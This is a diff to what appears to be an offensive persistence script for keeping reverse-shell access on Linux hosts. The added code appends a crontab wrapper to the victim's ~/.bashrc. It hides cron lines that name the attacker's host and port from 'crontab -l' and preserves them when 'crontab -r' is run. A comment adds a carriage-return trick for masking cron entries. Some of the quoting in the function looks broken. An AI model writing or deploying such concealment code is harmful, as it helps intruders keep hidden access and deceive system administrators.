@@ -89,6 +89,23 @@ then
 				DISABLEBASHRC=1
 				TMPSERVICE=.$(mktemp -u | sed 's/.*\.//g').service
 				TMPSERVICESHELLSCRIPT=.$(mktemp -u | sed 's/.*\.//g').sh
+				
+				# For crontab, I can either do the carriage return trick
+				# echo -e "* * * * * echo task\rno crontab for $USER" | crontab
+				# or use the bashrc to "hijack" "crontab -l" to list everything but ours
+				# for the carriage return trick, remember you may have to count columns to properly fill space
+				echo 'function crontab () {
+	REALBIN="$(which crontab)"
+	if $(echo "$1" | grep -qi "\-l");
+	then
+		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
+	elif $(echo "$1 | grep -qi "\-r);
+	then
+		if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
+	else
+		$REALBIN "${@:1}"
+	fi
+	}' >> ~/.bashrc
 			fi
 		else
 			echo -e $INFO
